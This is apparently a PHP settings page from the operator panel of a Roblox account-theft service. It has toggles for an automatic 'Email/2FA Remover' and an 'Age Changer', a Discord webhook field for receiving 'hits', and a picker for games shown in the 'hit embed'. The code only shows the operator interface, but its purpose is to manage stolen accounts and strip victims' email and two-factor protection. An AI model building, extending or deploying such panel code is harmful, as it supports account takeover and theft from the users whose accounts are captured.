<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

$__authResolved = ultimaAuthenticatedRegular();
if (!is_array($__authResolved)) {
    http_response_code(401);
    return;
}
$userData = $__authResolved;
$link_id = (int)$userData['link_id'];
$linkId = $link_id;
?>
<style>

    .game-slots-section { margin-top:20px; }
    .game-slots-label { display:flex; align-items:center; gap:6px; font-size:0.75rem; color:rgba(255,255,255,0.5); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px; }
    .game-slots-tip { position:relative; display:inline-flex; }
    .game-slots-tip-icon { width:15px; height:15px; border-radius:50%; border:1px solid rgba(255,255,255,0.12); color:rgba(255,255,255,0.25); font-size:0.55rem; display:flex; align-items:center; justify-content:center; cursor:default; transition:all .2s; font-style:normal; font-weight:600; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
    .game-slots-tip:hover .game-slots-tip-icon { border-color:rgba(255,255,255,0.3); color:rgba(255,255,255,0.5); }
    .game-slots-tip-text { position:absolute; bottom:calc(100% + 10px); left:50%; transform:translateX(-50%) translateY(6px) scale(.96); background:#0a0a0e; border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:10px 13px; font-size:0.7rem; font-weight:400; color:rgba(255,255,255,0.45); letter-spacing:0; text-transform:none; line-height:1.5; white-space:normal; width:200px; pointer-events:auto; opacity:0; transition:opacity .25s ease,transform .25s ease; z-index:10; box-shadow:0 12px 35px rgba(0,0,0,0.7); user-select:text; cursor:text; }
    .game-slots-tip-text::after { content:''; position:absolute; top:100%; left:50%; transform:translateX(-50%); border:5px solid transparent; border-top-color:#0a0a0e; }
    .game-slots-tip:hover .game-slots-tip-text { opacity:1; transform:translateX(-50%) translateY(0) scale(1); }
    .game-slots-row { display:flex; gap:12px; flex-wrap:wrap; }
    .game-slot { width:72px; height:72px; border-radius:14px; background:rgba(255,255,255,0.025); border:1.5px dashed rgba(255,255,255,0.1); display:flex; align-items:center; justify-content:center; cursor:pointer; transition:all .35s ease; position:relative; overflow:hidden; flex-shrink:0; }
    .game-slot:hover { border-color:rgba(255,255,255,0.2); box-shadow:0 0 16px rgba(255,255,255,0.04); }
    .game-slot.filled { border:1.5px solid rgba(255,255,255,0.1); border-style:solid; background:rgba(255,255,255,0.03); }
    .game-slot.filled:hover { border-color:rgba(255,255,255,0.2); box-shadow:0 0 18px rgba(255,255,255,0.05); }
    .game-slot-plus { color:rgba(255,255,255,0.15); font-size:1.4rem; font-weight:300; line-height:1; transition:color .35s; }
    .game-slot:hover .game-slot-plus { color:rgba(255,255,255,0.35); }
    .game-slot-img { width:100%; height:100%; object-fit:cover; border-radius:12px; }
    .game-slot-name { position:absolute; bottom:0; left:0; right:0; padding:2px 4px; background:linear-gradient(transparent,rgba(0,0,0,0.85)); font-size:0.5rem; color:rgba(255,255,255,0.8); text-align:center; border-radius:0 0 12px 12px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; line-height:1.3; padding-top:12px; }
    .game-popup-overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(5,5,10,0.7); backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px); z-index:100000; display:none; align-items:center; justify-content:center; opacity:0; transition:opacity .25s ease; }
    .game-popup-overlay.show { display:flex; opacity:1; }
    .game-popup { width:94%; max-width:680px; height:82vh; background:linear-gradient(145deg,#111218,#0c0d12); border:1px solid rgba(255,255,255,0.06); border-radius:16px; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 30px 90px rgba(0,0,0,0.5); }
    .game-popup-overlay.show .game-popup { animation:gpOpen .3s cubic-bezier(.34,1.4,.64,1) forwards; }
    @keyframes gpOpen { from{transform:scale(.94) translateY(16px)} to{transform:scale(1) translateY(0)} }
    .game-popup-header { padding:16px 18px 0; flex-shrink:0; display:flex; align-items:center; gap:12px; overflow:visible; position:relative; z-index:4; }
    .game-popup-slots { display:flex; gap:8px; flex-shrink:0; }
    .gp-slot { width:42px; height:42px; border-radius:10px; background:rgba(255,255,255,0.03); border:1.5px dashed rgba(255,255,255,0.08); display:flex; align-items:center; justify-content:center; position:relative; overflow:visible; cursor:pointer; transition:border-color .3s ease,box-shadow .3s ease,filter .3s ease; filter:brightness(.6); }
    .gp-slot.active { border-color:rgba(255,255,255,0.25); box-shadow:0 0 10px rgba(255,255,255,0.06); filter:brightness(1); }
    .gp-slot.filled { border:1.5px solid rgba(255,255,255,0.1); border-style:solid; }
    .gp-slot.filled.active { border-color:rgba(255,255,255,0.3); box-shadow:0 0 12px rgba(255,255,255,0.07); filter:brightness(1); }
    .gp-slot:not(.filled):hover::after { content:'Empty'; position:absolute; top:calc(100% + 6px); left:50%; transform:translateX(-50%); background:#0a0a0e; border:1px solid rgba(255,255,255,0.06); border-radius:5px; padding:3px 8px; font-size:.55rem; color:rgba(255,255,255,0.35); white-space:nowrap; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; pointer-events:none; z-index:5; }
    .gp-slot-plus { color:rgba(255,255,255,0.12); font-size:1rem; font-weight:300; }
    .gp-slot.active .gp-slot-plus { color:rgba(255,255,255,0.3); }
    .gp-slot-img { width:100%; height:100%; object-fit:cover; border-radius:8px; }
    .gp-slot-flash { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.75); border-radius:8px; font-size:.55rem; font-weight:600; color:rgba(255,255,255,0.8); font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; letter-spacing:.5px; animation:gpFlash .8s ease forwards; z-index:3; pointer-events:none; }
    @keyframes gpFlash { 0%{opacity:0;transform:scale(.9)} 20%{opacity:1;transform:scale(1)} 80%{opacity:1} 100%{opacity:0;transform:scale(.95)} }
    .game-popup-divider { display:flex; align-items:center; gap:10px; padding:10px 18px 6px; flex-shrink:0; }
    .game-popup-divider-line { flex:1; height:1px; background:rgba(255,255,255,0.04); }
    .game-popup-divider-text { font-size:.6rem; font-weight:400; color:rgba(255,255,255,0.13); text-transform:uppercase; letter-spacing:1.5px; white-space:nowrap; font-family:monospace; transition:opacity .25s ease; }
    .game-popup-divider-text.fade { opacity:0; }
    .game-search-box { position:relative; width:160px; min-width:160px; max-width:160px; flex-shrink:0; flex-grow:0; margin-left:auto; }
    .game-search-box input { width:100%; padding:8px 10px 8px 30px; background:rgba(255,255,255,0.035); border:1px solid rgba(255,255,255,0.06); border-radius:7px; color:#fff; font-family:'Rajdhani',sans-serif; font-size:.8rem; outline:none; transition:border-color .3s; box-sizing:border-box; overflow:hidden; text-overflow:ellipsis; }
    .game-search-box input:focus { border-color:rgba(255,255,255,0.15); }
    .game-search-box input::placeholder { color:rgba(255,255,255,0.15); }
    .game-search-icon { position:absolute; left:9px; top:50%; transform:translateY(-50%); color:rgba(255,255,255,0.12); font-size:.7rem; pointer-events:none; }
    .game-grid-wrapper { flex:1; overflow-y:auto; padding:6px 20px 18px; scrollbar-width:thin; scrollbar-color:rgba(255,255,255,0.08) transparent; }
    .game-grid-wrapper::-webkit-scrollbar { width:3px; }
    .game-grid-wrapper::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.08); border-radius:2px; }
    .game-grid { display:grid; grid-template-columns:repeat(5,1fr); gap:10px; }
    @media(max-width:768px){ .game-grid{grid-template-columns:repeat(3,1fr)!important;gap:8px!important;} .game-grid-wrapper{padding:6px 12px 18px!important;} .game-popup-header{padding:14px 12px 0!important;} .game-popup-divider{padding:8px 12px 4px!important;} }
    .game-grid-item { background:rgba(255,255,255,0.025); border:1px solid rgba(255,255,255,0.05); border-radius:10px; overflow:hidden; cursor:pointer; transition:border-color .25s ease,box-shadow .25s ease; position:relative; }
    .game-grid-item:hover { border-color:rgba(255,255,255,0.12); box-shadow:0 0 20px rgba(255,255,255,0.04); }
    .game-grid-item.selected { border-color:rgba(255,255,255,0.25); box-shadow:0 0 14px rgba(255,255,255,0.06); }
    .game-grid-item.selected::after { content:'\2713'; position:absolute; top:5px; right:5px; width:18px; height:18px; background:rgba(255,255,255,0.85); border-radius:50%; color:#000; font-size:10px; font-weight:700; display:flex; align-items:center; justify-content:center; z-index:2; }
    .game-grid-thumb { width:100%; aspect-ratio:1; background:rgba(255,255,255,0.015); overflow:hidden; }
    .game-grid-thumb img { width:100%; height:100%; object-fit:cover; filter:brightness(.85); transition:filter .3s ease; }
    .game-grid-item:hover .game-grid-thumb img { filter:brightness(1.1); }
    .game-grid-info { padding:6px 8px 8px; background:linear-gradient(to top,rgba(0,0,0,0.85) 0%,rgba(0,0,0,0.55) 50%,transparent 100%); margin-top:-32px; position:relative; z-index:1; padding-top:16px; }
    .game-grid-name { font-size:.7rem; font-weight:600; color:rgba(255,255,255,0.85); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; line-height:1.3; }
    .game-grid-players { font-size:.6rem; color:rgba(255,255,255,0.3); margin-top:2px; }
    .game-grid-loading { display:flex; align-items:center; justify-content:center; padding:50px 20px; color:rgba(255,255,255,0.2); font-size:.8rem; gap:8px; grid-column:1/-1; }
    .game-grid-loading .spinner { width:16px; height:16px; border:2px solid rgba(255,255,255,0.08); border-top-color:rgba(255,255,255,0.3); border-radius:50%; animation:gpSpin .7s linear infinite; }
    @keyframes gpSpin { to{transform:rotate(360deg);} }
    .game-grid-empty { text-align:center; padding:50px 20px; color:rgba(255,255,255,0.18); font-size:.8rem; grid-column:1/-1; }
</style>

<div id="settingsForm" class="tab-content hidden">
    <div class="card">
        <div class="toggle-box-container" style="overflow:visible;">
            <div class="toggle-box <?= ($userData['everyone_ping'] ?? 1) ? 'active' : '' ?>" onclick="toggleEveryone(this)" style="cursor:pointer;">
                <div class="toggle-box-info">
                    <span class="toggle-label">@everyone</span>
                    <span class="toggle-subtitle toggle-status"><?= ($userData['everyone_ping'] ?? 1) ? 'ON' : 'OFF' ?></span>
                </div>
                <div class="modern-switch"></div>
            </div>
            <div class="toggle-box <?= ($userData['email2fa_remover'] ?? 1) ? 'active' : '' ?>" onclick="toggleEmail2fa(this)" style="cursor:pointer;position:relative;overflow:visible;">
                <div class="toggle-box-info">
                    <span class="toggle-label">Email/2FA Remover<span style="color:rgba(255,255,255,0.3);font-weight:400;font-size:0.75rem;margin-left:4px;">[Auto]</span></span>
                    <span class="toggle-subtitle toggle-status"><?= ($userData['email2fa_remover'] ?? 1) ? 'ON' : 'OFF' ?></span>
                </div>
                <div class="modern-switch"></div>
            </div>
            <div class="toggle-box active" style="cursor:default;">
                <div class="toggle-box-info">
                    <span class="toggle-label">Age Changer</span>
                    <span class="toggle-subtitle">Age Changer</span>
                </div>
                <div class="modern-switch"></div>
            </div>
        </div>

        <div class="settings-webhook-group">
            <label>WEBHOOK</label>
            <input type="url" id="settingsWebhook" value="<?= htmlspecialchars($userData['webhook'] ?? '') ?>" placeholder="https://discord.com/api/webhooks/..." onchange="saveWebhook(this)">
        </div>

        <div class="game-slots-section">
            <span class="game-slots-label">Extra Games — Embed <span class="game-slots-tip"><i class="game-slots-tip-icon">?</i><span class="game-slots-tip-text">3 additional games will be displayed in your hit embed (choosing too many games has the potential to slow down your hit)</span></span></span>
            <div class="game-slots-row" id="gameSlotsRow">
                <div class="game-slot" data-slot="0" onclick="openGamePopup(0)"><span class="game-slot-plus">+</span></div>
                <div class="game-slot" data-slot="1" onclick="openGamePopup(1)"><span class="game-slot-plus">+</span></div>
                <div class="game-slot" data-slot="2" onclick="openGamePopup(2)"><span class="game-slot-plus">+</span></div>
            </div>
        </div>
    </div>
</div>

<div class="game-popup-overlay" id="gamePopupOverlay" onclick="if(event.target===this)closeGamePopup()">
    <div class="game-popup">
        <div class="game-popup-header">
            <div class="game-popup-slots" id="popupSlots">
                <div class="gp-slot active" data-pslot="0" onclick="setActiveSlot(0)"><span class="gp-slot-plus">+</span></div>
                <div class="gp-slot" data-pslot="1" onclick="setActiveSlot(1)"><span class="gp-slot-plus">+</span></div>
                <div class="gp-slot" data-pslot="2" onclick="setActiveSlot(2)"><span class="gp-slot-plus">+</span></div>
            </div>
            <div class="game-search-box">
                <i class="fas fa-search game-search-icon"></i>
                <input type="text" id="gameSearchInput" placeholder="Search..." oninput="handleGameSearch(this.value)">
            </div>
        </div>
        <div class="game-popup-divider">
            <span class="game-popup-divider-line"></span>
            <span class="game-popup-divider-text" id="gamePopupHeading">Trending</span>
            <span class="game-popup-divider-line"></span>
        </div>
        <div class="game-grid-wrapper">
            <div class="game-grid" id="gameGrid"></div>
        </div>
    </div>
</div>

<script>
async function toggleEmail2fa(box){
    var isActive=box.classList.contains('active');
    var newVal=isActive?0:1;
    box.classList.toggle('active');
    box.querySelector('.toggle-status').textContent=newVal?'ON':'OFF';
    try{
        var r=await fetch(location.pathname+'?action=toggle_email2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email2fa_remover:newVal})});
        var d=await r.json();
        if(d.success){if(typeof showSuccessModal==='function')showSuccessModal();}else{box.classList.toggle('active');box.querySelector('.toggle-status').textContent=isActive?'ON':'OFF';}
    }catch(e){box.classList.toggle('active');box.querySelector('.toggle-status').textContent=isActive?'ON':'OFF';}
}
</script>

<script>
(function(){
    var extraGames=[null,null,null],activeSlot=0,trendingCache=null,searchTimeout=null;

    async function loadExtraGames(){
        try{
            var r=await fetch(location.pathname+'?action=get_extra_games');
            var d=await r.json();
            if(d.success&&d.games){for(var i=0;i<3;i++)extraGames[i]=d.games[i]||null;renderSlots();}
        }catch(e){}
    }

    function renderSlots(){
        for(var i=0;i<3;i++){
            var slot=document.querySelector('.game-slot[data-slot="'+i+'"]');
            if(!slot)continue;
            var g=extraGames[i];
            var uid=g?g.universeId:0;
            var prev=slot.dataset.uid||'0';
            if(String(uid)===String(prev))continue;
            slot.dataset.uid=uid;
            if(g&&g.name){
                slot.classList.add('filled');
                slot.innerHTML=(g.icon?'<img class="game-slot-img" src="'+g.icon+'" alt="" loading="lazy">':'')+
                    '<div class="game-slot-name">'+esc(g.name.length>14?g.name.substring(0,12)+'\u2026':g.name)+'</div>';
            }else{
                slot.classList.remove('filled');
                slot.innerHTML='<span class="game-slot-plus">+</span>';
            }
        }
        renderPopupSlots();
    }

    function renderPopupSlots(){
        for(var i=0;i<3;i++){
            var ps=document.querySelector('.gp-slot[data-pslot="'+i+'"]');
            if(!ps)continue;
            var g=extraGames[i];
            ps.classList.toggle('active',i===activeSlot);
            var uid=g?g.universeId:0;
            var prev=ps.dataset.uid||'0';
            if(String(uid)===String(prev))continue;
            ps.dataset.uid=uid;
            if(g&&g.name){
                ps.classList.add('filled');
                ps.innerHTML=g.icon?'<img class="gp-slot-img" src="'+g.icon+'" alt="" loading="lazy">':'';
            }else{
                ps.classList.remove('filled');
                ps.innerHTML='<span class="gp-slot-plus">+</span>';
            }
        }
    }

    window.setActiveSlot=function(idx){
        activeSlot=idx;
        renderPopupSlots();
    };

    async function saveExtraGames(){
        try{
            await fetch(location.pathname+'?action=save_extra_games',{
                method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({games:extraGames.filter(function(g){return g!==null;})})
            });
        }catch(e){}
    }

    function setHeading(txt){
        var h=document.getElementById('gamePopupHeading');
        h.classList.add('fade');
        setTimeout(function(){h.textContent=txt;h.classList.remove('fade');},150);
    }

    window.openGamePopup=function(slotIdx){
        activeSlot=slotIdx;
        var ov=document.getElementById('gamePopupOverlay');
        document.getElementById('gameSearchInput').value='';
        document.getElementById('gamePopupHeading').textContent='Trending';
        renderPopupSlots();
        ov.style.display='flex';
        requestAnimationFrame(function(){ov.classList.add('show');});
        loadTrending();
    };

    window.closeGamePopup=function(){
        var ov=document.getElementById('gamePopupOverlay');
        ov.classList.remove('show');
        setTimeout(function(){
            ov.style.display='none';
            document.getElementById('gameSearchInput').value='';
            document.getElementById('gamePopupHeading').textContent='Trending';
        },250);
    };

    window.handleGameSearch=function(val){
        clearTimeout(searchTimeout);
        if(val.trim().length<2){
            setHeading('Trending');
            loadTrending();
            return;
        }
        setHeading('Results');
        searchTimeout=setTimeout(function(){searchGames(val.trim());},400);
    };

    async function loadTrending(){
        if(trendingCache){renderGrid(trendingCache);return;}
        showLoading();
        try{
            var r=await fetch(location.pathname+'?action=roblox_trending');
            var d=await r.json();
            if(d.success&&d.games){trendingCache=d.games;renderGrid(d.games);}
            else showEmpty('Could not load');
        }catch(e){showEmpty('Connection error');}
    }

    async function searchGames(query){
        showLoading();
        try{
            var r=await fetch(location.pathname+'?action=roblox_search&q='+encodeURIComponent(query));
            var d=await r.json();
            if(d.success&&d.games&&d.games.length>0)renderGrid(d.games);
            else showEmpty('No results');
        }catch(e){showEmpty('Search failed');}
    }

    function renderGrid(games){
        var grid=document.getElementById('gameGrid');
        if(!games||games.length===0){showEmpty('No games');return;}
        var sel={};
        extraGames.forEach(function(g){if(g)sel[g.universeId]=true;});
        var h='';
        games.forEach(function(g){
            var s=sel[g.universeId]?' selected':'';
            var p=g.playerCount?fmtNum(g.playerCount)+' playing':'';
            var gj=JSON.stringify(g).replace(/'/g,"\\'").replace(/"/g,'&quot;');
            h+='<div class="game-grid-item'+s+'" onclick="pickExtraGame(JSON.parse(this.dataset.g))" data-g="'+gj+'" data-uid="'+g.universeId+'">'+
                '<div class="game-grid-thumb">'+(g.icon?'<img src="'+g.icon+'" alt="" loading="lazy">':'')+'</div>'+
                '<div class="game-grid-info"><div class="game-grid-name" title="'+esc(g.name)+'">'+esc(g.name)+'</div>'+(p?'<div class="game-grid-players">'+p+'</div>':'')+'</div></div>';
        });
        grid.innerHTML=h;
    }

    function showLoading(){document.getElementById('gameGrid').innerHTML='<div class="game-grid-loading"><div class="spinner"></div></div>';}
    function showEmpty(m){document.getElementById('gameGrid').innerHTML='<div class="game-grid-empty">'+m+'</div>';}

    window.pickExtraGame=function(game){
        var inActive=extraGames[activeSlot]&&extraGames[activeSlot].universeId===game.universeId;
        if(inActive){
            extraGames[activeSlot]=null;
        }else{
            var otherIdx=-1;
            extraGames.forEach(function(g,i){if(i!==activeSlot&&g&&g.universeId===game.universeId)otherIdx=i;});
            if(otherIdx>=0){
                var ps=document.querySelector('.gp-slot[data-pslot="'+otherIdx+'"]');
                if(ps){
                    var old=ps.querySelector('.gp-slot-flash');
                    if(old)old.remove();
                    var fl=document.createElement('div');
                    fl.className='gp-slot-flash';
                    fl.textContent='Click';
                    ps.appendChild(fl);
                    setTimeout(function(){fl.remove();},850);
                }
                return;
            }
            extraGames[activeSlot]={universeId:game.universeId,rootPlaceId:game.rootPlaceId||0,name:game.name,icon:game.icon||''};
        }
        renderSlots();saveExtraGames();
        var sel={};
        extraGames.forEach(function(g){if(g)sel[g.universeId]=true;});
        document.querySelectorAll('.game-grid-item').forEach(function(el){
            var uid=parseInt(el.dataset.uid);
            el.classList.toggle('selected',!!sel[uid]);
        });
    };

    function esc(s){return s?s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'):'';}
    function fmtNum(n){return n>=1e6?(n/1e6).toFixed(1)+'M':n>=1e3?(n/1e3).toFixed(1)+'K':n+'';}

    document.addEventListener('DOMContentLoaded',loadExtraGames);
})();
</script>
